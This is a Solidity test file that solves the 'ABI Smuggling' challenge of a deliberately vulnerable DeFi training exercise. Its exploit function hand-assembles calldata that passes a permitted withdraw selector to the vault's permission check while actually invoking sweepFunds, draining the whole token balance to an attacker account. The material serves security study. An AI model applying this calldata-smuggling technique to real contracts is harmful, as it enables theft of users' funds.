// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableToken.sol";
import "../../src/abi-smuggling/AuthorizedExecutor.sol";
import "../../src/abi-smuggling/SelfAuthorizedVault.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract ABISmugglingTest is BaseTest {
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000 ether;

    address payable attacker;
    address payable deployer;

    SelfAuthorizedVault vault;
    DamnValuableToken token;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "Deployer";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        deployer = users[1];
    }

    function test_ABISmuggling() public {
        runTest();
    }

    function exploit() internal override {
        bytes32[] memory ids = new bytes32[](2);

        vm.startPrank(deployer);

        token = new DamnValuableToken();
        vault = new SelfAuthorizedVault();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        ids[0] = vault.getActionId(
            bytes4(0x85fb709d),
            address(deployer),
            address(vault)
        );
        ids[1] = vault.getActionId(
            bytes4(0xd9caed12),
            address(attacker),
            address(vault)
        );
        vault.setPermissions(ids);
        vm.stopPrank();
        assertEq(vault.initialized(), true);

        assertEq(vault.permissions(ids[0]), true);
        assertEq(vault.permissions(ids[1]), true);

        vm.warp(block.timestamp + 15 days + 1);
        vm.startPrank(attacker);

        bytes memory data = bytes.concat(
            vault.execute.selector,
            bytes12(uint96(0)),
            bytes20(address(vault)),
            bytes32(uint256(100)),
            bytes32(uint256(0)),
            vault.withdraw.selector,
            bytes32(uint256(68)),
            vault.sweepFunds.selector,
            bytes12(uint96(0)),
            bytes20(address(attacker)),
            bytes12(uint96(0)),
            bytes20(address(token))
        );
        (bool ok, ) = address(vault).call(data);

        vm.stopPrank();
    }

    function success() internal override {
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
    }
}
